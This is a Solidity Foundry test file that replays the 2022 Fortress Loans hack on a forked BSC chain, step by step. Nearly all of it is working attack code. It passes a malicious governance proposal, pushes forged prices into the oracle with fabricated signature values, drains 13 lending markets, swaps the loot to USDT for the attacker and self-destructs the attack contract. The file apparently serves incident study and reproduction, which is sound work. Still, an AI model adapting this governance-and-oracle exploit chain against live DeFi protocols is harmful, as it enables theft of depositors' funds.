// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {IERC20, IPriceFeed, IPancakeRouter, IUnitroller, IVyper} from "../interface.sol";

/* @KeyInfo -- Total Lost : 1,048 ETH + 400,000 DAI (~3,000,000 US$)
    Attacker Wallet : https://bscscan.com/address/0xA6AF2872176320015f8ddB2ba013B38Cb35d22Ad
    Attacker Contract : https://bscscan.com/address/0xcd337b920678cf35143322ab31ab8977c3463a45
    Fortress PriceOracle : https://bscscan.com/address/0x00fcf33bfa9e3ff791b2b819ab2446861a318285#code
    Chain Contract : https://bscscan.com/address/0xc11b687cd6061a6516e23769e4657b6efa25d78e#code
    Fortress Governor Alpha : https://bscscan.com/address/0xe79ecdb7fedd413e697f083982bac29e93d86b2e#code
    Price Feed : https://bscscan.com/address/0xaa24b64c9b44d874368b09325c6d60165c4b39f2#code
*/

/* @News
    Official Announce : https://mobile.twitter.com/Fortressloans/status/1523495202115051520
    PeckShield Alert Thread : https://twitter.com/PeckShieldAlert/status/1523489670323404800
    Blocksec Alert Thread : https://twitter.com/BlockSecTeam/status/1523530484877209600
*/

/* @Reports
    CertiK Incident Analysis : https://www.certik.com/resources/blog/k6eZOpnK5Kdde7RfHBZgw-fortress-loans-exploit
    Anquanke Incident Analysis : https://www.anquanke.com/post/id/273207
    Freebuf Incident Analysis : https://www.freebuf.com/articles/blockchain-articles/332879.html
    Learnblockchain.cn Analysis :  https://learnblockchain.cn/article/4062
*/

address constant attacker = 0xA6AF2872176320015f8ddB2ba013B38Cb35d22Ad;
address constant MAHA = 0xCE86F7fcD3B40791F63B86C3ea3B8B355Ce2685b;
address constant FTS = 0x4437743ac02957068995c48E08465E0EE1769fBE;
address constant fFTS = 0x854C266b06445794FA543b1d8f6137c35924C9EB;
address constant GovernorAlpha = 0xE79ecdB7fEDD413E697F083982BAC29e93d86b2E;
address constant ChainContract = 0xc11B687cd6061A6516E23769E4657b6EfA25d78E;
address constant FortressPriceOracle = 0x00fcF33BFa9e3fF791b2b819Ab2446861a318285;
address constant PriceFeed = 0xAa24b64C9B44D874368b09325c6D60165c4B39f2;
address constant Unitroller = 0x67340Bd16ee5649A37015138B3393Eb5ad17c195;
address constant BorrowerOperations = 0xd55555376f9A43229Dc92abc856AA93Fee617a9A;
address constant ARTH = 0xB69A424Df8C737a122D0e60695382B3Eec07fF4B;
address constant ARTHUSD = 0x88fd584dF3f97c64843CD474bDC6F78e398394f4;
address constant Vyper1 = 0x98245Bfbef4e3059535232D68821a58abB265C45;
address constant Vyper2 = 0x1d4B4796853aEDA5Ab457644a18B703b6bA8b4aB;
address constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant USDT = 0x55d398326f99059fF775485246999027B3197955;

interface IGovernorAlpha {
    function propose(
        address[] memory targets,
        uint[] memory values,
        string[] memory signatures,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint);

    function castVote(uint256 proposalId, bool support) external;

    function queue(uint256 proposalId) external;

    function execute(uint256 proposalId) external payable;

    function state(uint256 proposalId) external view;

    function proposalThreshold() external view returns (uint);
}

interface IChain {
    function submit(
        uint32 _dataTimestamp,
        bytes32 _root,
        bytes32[] memory _keys,
        uint256[] memory _values,
        uint8[] memory _v,
        bytes32[] memory _r,
        bytes32[] memory _s
    ) external;
}

interface FToken {}

interface IFortressPriceOracle {
    function getUnderlyingPrice(FToken fToken) external view returns (uint256);
}

interface IFTS {
    function approve(address spender, uint256 rawAmount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function delegate(address delegatee) external;

    function getPriorVotes(address account, uint blockNumber) external view returns (uint96);
}

interface IfFTS {
    function mint(uint256 mintAmount) external returns (uint256);

    function balanceOf(address owner) external view returns (uint256);
}

interface IFBep20Delegator {
    function getCash() external view returns (uint256);

    function borrow(uint256 borrowAmount) external returns (uint256);

    function underlying() external returns (address);
}

interface IBorrowerOperations {
    function openTrove(
        uint256 _maxFee,
        uint256 _LUSDAmount,
        uint256 _ETHAmount,
        address _upperHint,
        address _lowerHint,
        address _frontEndTag
    ) external;
}

contract ProposalCreateFactory {}

contract Attack is Test {
    /* Method 0x2b69be8e */
    function exploit() public {
        // Excute Proposal 11
        IGovernorAlpha(GovernorAlpha).execute(11);
        emit log_string("\t[info] Executed Proposal Id 11");

        // Manipulate the price oracle
        bytes32 _root = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d886;
        bytes32[] memory _keys = new bytes32[](2);
        _keys[0] = 0x000000000000000000000000000000000000000000000000004654532d555344;
        _keys[1] = 0x0000000000000000000000000000000000000000000000004d4148412d555344;
        uint256[] memory _values = new uint256[](2);
        _values[0] = 4e34;
        _values[1] = 4e34;
        uint8[] memory _v = new uint8[](4);
        _v[0] = 28;
        _v[1] = 28;
        _v[2] = 28;
        _v[3] = 28;
        bytes32[] memory _r = new bytes32[](4);
        _r[0] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d885;
        _r[1] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d882;
        _r[2] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d877;
        _r[3] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d881;
        bytes32[] memory _s = new bytes32[](4);
        _s[0] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d825;
        _s[1] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d832;
        _s[2] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d110;
        _s[3] = 0x6b336703993c6c151a39d97a5cf3708a5f9bfd338d958d4b71c6416a6ab8d841;
        IChain(ChainContract).submit(uint32(block.timestamp), _root, _keys, _values, _v, _r, _s);
        emit log_string("\t[info] Chain.submit() Success");

        // Check the FTS price is manipulated (from Fortress Loans perspective 📈)
        // This article explains how Chain.submit() affected FTS price: https://blog.csdn.net/Timmbe/article/details/124678475
        uint256 _checkpoint;
        _checkpoint = IFortressPriceOracle(FortressPriceOracle).getUnderlyingPrice(FToken(fFTS));
        assert(_checkpoint == 4e34); // make sure have same result as mainnet tx
        emit log_string("\t[info] FortressPriceOracle.getUnderlyingPrice(FToken(fFTS)) Success");

        // Fetch price
        _checkpoint = IPriceFeed(PriceFeed).fetchPrice();
        assert(_checkpoint == 2e34); // make sure have same result as mainnet tx
        emit log_string("\t[info] PriceFeed.fetchPrice() Success");

        // Enter fFTS markets
        address[] memory _tmp = new address[](1);
        _tmp[0] = fFTS;
        IUnitroller(Unitroller).enterMarkets(_tmp);
        emit log_string("\t[info] Unitroller.enterMarkets(fFTS) Success");

        // Provide 100 FTS Token as collateral, mint fFTS
        IFTS(FTS).approve(fFTS, type(uint256).max);
        uint256 _FTS_balance = IFTS(FTS).balanceOf(address(this));
        IfFTS(fFTS).mint(_FTS_balance);
        assert(IfFTS(fFTS).balanceOf(address(this)) == 499_999_999_999);
        emit log_string("\t[info] fFTS.mint(FTS) Success");

        // Get all Fortress Loans markets
        address[] memory markets = IUnitroller(Unitroller).getAllMarkets();
        address fbnb = markets[0]; // 0xe24146585e882b6b59ca9bfaaaffed201e4e5491
        address fusdc = markets[1]; // 0x3ef88d7fde18fe966474fe3878b802f678b029bc
        address fusdt = markets[2]; // 0x554530ecde5a4ba780682f479bc9f64f4bbff3a1
        address fbusd = markets[3]; // 0x8bb0d002bac7f1845cb2f14fe3d6aae1d1601e29
        address fbtc = markets[4]; // 0x47baa29244c342f1e6cde11c968632e7403ae258
        address feth = markets[5]; // 0x5f3ef8b418a8cd7e3950123d980810a0a1865981
        address fltc = markets[6]; // 0xe75b16cc66f8820fb97f52f0c25f41982ba4daf3
        address fxrp = markets[7]; // 0xa7fb72808de4ffcacf9a815bd1ccbe70f03b54ca
        address fada = markets[8]; // 0x4c0933453359733b4867dff1145a9a0749931a00
        address fdai = markets[9]; // 0x5f30fdddcf14a0997a52fdb7d7f23b93f0f21998
        address fdot = markets[10]; // 0x8fc4f7a57bb19e701108b17d785a28118604a3d1
        address fbeth = markets[11]; // 0x8ed1f4c1326e5d3c1b6e99ac9e5ec6651e11e3da
        address fshib = markets[14]; // 0x073c0ac03e7c839c718a65e0c4d0724cc0bd2b5f

        // Borrow ERC-20 Tokens
        IFBep20Delegator[13] memory Delegators = [
            IFBep20Delegator(fbnb),
            IFBep20Delegator(fusdc),
            IFBep20Delegator(fusdt),
            IFBep20Delegator(fbusd),
            IFBep20Delegator(fbtc),
            IFBep20Delegator(feth),
            IFBep20Delegator(fltc),
            IFBep20Delegator(fxrp),
            IFBep20Delegator(fada),
            IFBep20Delegator(fdai),
            IFBep20Delegator(fdot),
            IFBep20Delegator(fbeth),
            IFBep20Delegator(fshib)
        ];

        for (uint8 i; i < Delegators.length; i++) {
            uint256 borrowAmount = Delegators[i].getCash();
            Delegators[i].borrow(borrowAmount);
        }

        emit log_string("\t[info] 13 markets ERC-20 token borrow Success");

        IERC20(MAHA).approve(BorrowerOperations, type(uint256).max);
        IBorrowerOperations(BorrowerOperations).openTrove(
            1e18,
            1e27,
            IERC20(MAHA).balanceOf(address(this)),
            address(0),
            address(0),
            address(0)
        );

        IERC20(ARTH).approve(ARTHUSD, type(uint256).max);
        IERC20(ARTHUSD).deposit(1e27);

        IERC20(ARTHUSD).approve(Vyper1, type(uint256).max);
        IERC20(ARTHUSD).approve(Vyper2, type(uint256).max);

        IVyper(Vyper1).exchange_underlying(0, 3, 5e26, 0, msg.sender);
        IVyper(Vyper2).exchange_underlying(0, 3, 15e26, 0, msg.sender);
    }

    function withdrawAll() public {
        // Get all Fortress Loans markets
        address[] memory markets = IUnitroller(Unitroller).getAllMarkets();
        address fbnb = markets[0]; // 0xe24146585e882b6b59ca9bfaaaffed201e4e5491
        address fusdc = markets[1]; // 0x3ef88d7fde18fe966474fe3878b802f678b029bc
        address fusdt = markets[2]; // 0x554530ecde5a4ba780682f479bc9f64f4bbff3a1
        address fbusd = markets[3]; // 0x8bb0d002bac7f1845cb2f14fe3d6aae1d1601e29
        address fbtc = markets[4]; // 0x47baa29244c342f1e6cde11c968632e7403ae258
        address feth = markets[5]; // 0x5f3ef8b418a8cd7e3950123d980810a0a1865981
        address fltc = markets[6]; // 0xe75b16cc66f8820fb97f52f0c25f41982ba4daf3
        address fxrp = markets[7]; // 0xa7fb72808de4ffcacf9a815bd1ccbe70f03b54ca
        address fada = markets[8]; // 0x4c0933453359733b4867dff1145a9a0749931a00
        address fdai = markets[9]; // 0x5f30fdddcf14a0997a52fdb7d7f23b93f0f21998
        address fdot = markets[10]; // 0x8fc4f7a57bb19e701108b17d785a28118604a3d1
        address fbeth = markets[11]; // 0x8ed1f4c1326e5d3c1b6e99ac9e5ec6651e11e3da
        address fshib = markets[14]; // 0x073c0ac03e7c839c718a65e0c4d0724cc0bd2b5f

        IFBep20Delegator[13] memory Delegators = [
            IFBep20Delegator(fbnb),
            IFBep20Delegator(fusdc),
            IFBep20Delegator(fusdt),
            IFBep20Delegator(fbusd),
            IFBep20Delegator(fbtc),
            IFBep20Delegator(feth),
            IFBep20Delegator(fltc),
            IFBep20Delegator(fxrp),
            IFBep20Delegator(fada),
            IFBep20Delegator(fdai),
            IFBep20Delegator(fdot),
            IFBep20Delegator(fbeth),
            IFBep20Delegator(fshib)
        ];

        // Swap each underlyAsset to attacker, Path: Asset->WBNB->USDT
        for (uint256 i = 0; i < 13; i++) {
            if (address(Delegators[i]) == 0xE24146585E882B6b59ca9bFaaaFfED201E4E5491) continue; // Skip Fortress BNB  (fBNB), use singleHop swap later
            if (address(Delegators[i]) == 0x554530ecDE5A4Ba780682F479BC9F64F4bBFf3a1) continue; // Skip Fortress USDT (fUSDT), transfer USDT later

            address underlyAsset = Delegators[i].underlying(); // Resolve underlyAsset address
            uint256 amount = IERC20(underlyAsset).balanceOf(address(this)); // Get each underlyAsset balance

            address[] memory mulitHop = new address[](3); // Do swap
            mulitHop[0] = underlyAsset;
            mulitHop[1] = WBNB;
            mulitHop[2] = USDT;
            IERC20(underlyAsset).approve(PancakeRouter, type(uint256).max);
            IPancakeRouter(payable(PancakeRouter)).swapExactTokensForTokens(
                amount,
                0,
                mulitHop,
                msg.sender,
                block.timestamp
            );
        }

        // Swap WBNB->USDT to attacker
        address[] memory singleHop = new address[](2);
        singleHop[0] = WBNB;
        singleHop[1] = USDT;
        IPancakeRouter(payable(PancakeRouter)).swapExactETHForTokens{value: address(this).balance}(
            0,
            singleHop,
            msg.sender,
            block.timestamp
        );
        emit log_string("\t[Pass] Swap BNB->USDT, amountOut send to attacker");

        // Transfer all USDT balance to attacker
        uint256 usdt_balance = IERC20(USDT).balanceOf(address(this));
        IERC20(USDT).transfer(msg.sender, usdt_balance);
        emit log_string("\t[Pass] Transfer all USDT balance to attacker");
    }

    /* Method 0xd4ddb845 */
    function kill() public {
        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}

contract Hacker is Test {
    using stdStorage for StdStorage;

    constructor() {
        vm.createSelectFork("bsc", 17_490_837); // Fork BSC mainnet at block 17490837
        emit log_string("This reproduce shows how attacker exploit Fortress Loan, cause ~3,000,000 US$ lost");
        emit log_named_decimal_uint("[Start] Attacker Wallet USDT Balance", IERC20(USDT).balanceOf(address(this)), 18);
        vm.label(attacker, "AttackerWallet");
        vm.label(address(this), "AttackContract");
        vm.label(USDT, "USDT");
        vm.label(MAHA, "MahaDAOProxy");
        vm.label(FTS, "FTS");
        vm.label(fFTS, "fFTS");
        vm.label(GovernorAlpha, "GovernorAlpha");
        vm.label(ChainContract, "Chain");
        vm.label(FortressPriceOracle, "FortressPriceOracle");
        vm.label(PriceFeed, "PriceFeed");
        vm.label(Unitroller, "Unitroller");
        vm.label(BorrowerOperations, "BorrowerOperations");
        vm.label(ARTH, "ARTH");
        vm.label(ARTHUSD, "ARTHUSD");
        vm.label(Vyper1, "Vyper1");
        vm.label(Vyper2, "Vyper2");
        vm.label(PancakeRouter, "PancakeRouter");
    }

    function testExploit() public {
        // txId : 0x18dc1cafb1ca20989168f6b8a087f3cfe3356d9a1edd8f9d34b3809985203501
        // Do : Attacker Create [ProposalCreater] Contract
        vm.rollFork(17_490_837); // make sure start from block 17490837
        vm.startPrank(attacker); // Set msg.sender = attacker
        ProposalCreateFactory PCreater = new ProposalCreateFactory();
        vm.stopPrank();
        vm.label(address(PCreater), "ProposalCreateFactory");
        emit log_named_address("[Pass] Attacker created [ProposalCreater] contract", address(PCreater));

        // txId : 0x12bea43496f35e7d92fb91bf2807b1c95fcc6fedb062d66678c0b5cfe07cc002
        // Do : Create Proposal Id 11
        vm.createSelectFork("bsc", 17_490_882);

        address[] memory _target = new address[](1);
        uint[] memory _value = new uint[](1);
        string[] memory _signature = new string[](1);
        bytes[] memory _calldata = new bytes[](1);

        _target[0] = Unitroller;
        _value[0] = 0;
        _signature[0] = "_setCollateralFactor(address,uint256)";
        _calldata[0] = abi.encode(fFTS, 700_000_000_000_000_000);

        vm.prank(address(PCreater));
        IGovernorAlpha(GovernorAlpha).propose(
            _target,
            _value,
            _signature,
            _calldata,
            "Add the FTS token as collateral."
        );
        emit log_string("[Pass] Attacker created Proposal Id 11");

        // txId : 0x83a4f8f52b8f9e6ff1dd76546a772475824d9aa5b953808dbc34d1f39250f29d
        // Do : Vote Proposal Id 11
        vm.createSelectFork("bsc", 17_570_125);
        vm.prank(0x58f96A6D9ECF0a7c3ACaD2f4581f7c4e42074e70); // Malicious voter
        IGovernorAlpha(GovernorAlpha).castVote(11, true);
        emit log_string("[Pass] Unknown malicious voter supported Proposal 11");

        // txId : 0xc368afb2afc499e7ebb575ba3e717497385ef962b1f1922561bcb13f85336252
        // Do : Vote Proposal Id 11
        vm.createSelectFork("bsc", 17_570_164);
        vm.prank(attacker);
        IGovernorAlpha(GovernorAlpha).castVote(11, true);
        emit log_string("[Pass] Attacker supported Proposal 11");

        // txId : 0x647c6e89cd1239381dd49a43ca2f29a9fdeb6401d4e268aff1c18b86a7e932a0
        // Do : Queue Proposal Id 11
        vm.createSelectFork("bsc", 17_577_532);
        vm.prank(attacker);
        IGovernorAlpha(GovernorAlpha).queue(11);
        emit log_string("[Pass] Attacker queued Proposal 11");

        // txId : 0x4800928c95db2fc877f8ba3e5a41e208231dc97812b0174e75e26cca38af5039
        // Do : Create Attack Contract
        vm.createSelectFork("bsc", 17_634_589);
        vm.setNonce(attacker, 69);
        vm.startPrank(attacker);
        Attack attackContract = new Attack();
        vm.stopPrank();
        vm.label(address(attackContract), "AttackContract");
        assert(address(attackContract) == 0xcD337b920678cF35143322Ab31ab8977C3463a45); // make sure deployAddr is same as mainnet
        emit log_named_address("[Pass] Attacker created [AttackContract] contract", address(attackContract));

        // txId : 0x6a04f47f839d6db81ba06b17b5abbc8b250b4c62e81f4a64aa6b04c0568dc501
        // Do : Send 3.0203 MahaDAO to Attack Contract
        // Note : This tx is not part of exploit chain, so we just cheat it to skip some pre-swap works ;)
        stdstore.target(MAHA).sig(IERC20(MAHA).balanceOf.selector).with_key(address(attackContract)).checked_write(
            3_020_309_536_199_074_866
        );
        assert(IERC20(MAHA).balanceOf(address(attackContract)) == 3_020_309_536_199_074_866);
        emit log_string("[Pass] Attacker send 3.0203 MahaDAO to [AttackContract] contract");

        // txId : 0xd127c438bdac59e448810b812ffc8910bbefc3ebf280817bd2ed1e57705588a0
        // Do : Send 100 FTS to Attack Contract
        // Note : This tx is not part of exploit chain, so we just cheat it to skip some pre-swap works ;)
        stdstore.target(FTS).sig(IFTS(FTS).balanceOf.selector).with_key(address(attackContract)).checked_write(
            100 ether
        );
        assert(IFTS(FTS).balanceOf(address(attackContract)) == 100 ether);
        emit log_string("[Pass] Attacker send 100 FTS to [AttackContract] contract");

        // txId : 0x13d19809b19ac512da6d110764caee75e2157ea62cb70937c8d9471afcb061bf
        // Do : Execute Proposal Id 11
        vm.roll(17_634_663); // No fork here, otherwise will get Error("do not spam") in Chain.sol
        vm.warp(1_652_042_082); // 2022-05-08 20:34:42 UTC+0
        vm.startPrank(attacker);
        attackContract.exploit();
        vm.stopPrank();
        emit log_string("[Pass] Attacker triggered the exploit");

        // txId : 0x851a65865ec89e64f0000ab973a92c3313ea09e80eb4b4660195a14d254cd425
        // Do : Withdraw All
        vm.roll(17_634_670); // We need to verify the reproduce run as expected, so don't use createSelectFork()
        vm.warp(1_651_998_903); // 2022-05-08 20:35:03 UTC+0
        vm.startPrank(attacker);
        attackContract.withdrawAll();
        vm.stopPrank();
        emit log_string("[Pass] Attacker successfully withdrew the profit");

        // txId : 0xde8d9d55a5c795b2b9b3cd5b648a29b392572719fbabd91993efcd2bc57110d3
        // Do : Destruct the Attack Contract
        vm.roll(17_635_247);
        vm.warp(1_652_043_834); // 2022-05-08 21:03:54 UTC+0
        vm.startPrank(attacker);
        attackContract.kill();
        vm.stopPrank();
        emit log_string("[Pass] Attacker destruct the Attack Contract");

        emit log_named_decimal_uint("[End] Attacker Wallet USDT Balance", IERC20(USDT).balanceOf(attacker), 18);

        // You shold see attacker profit about 300K USDT
        // The USDT were moved after swapping across the cBridge(Celer Network), and swapped them into ETH and DAI.
    }

    receive() external payable {}
}
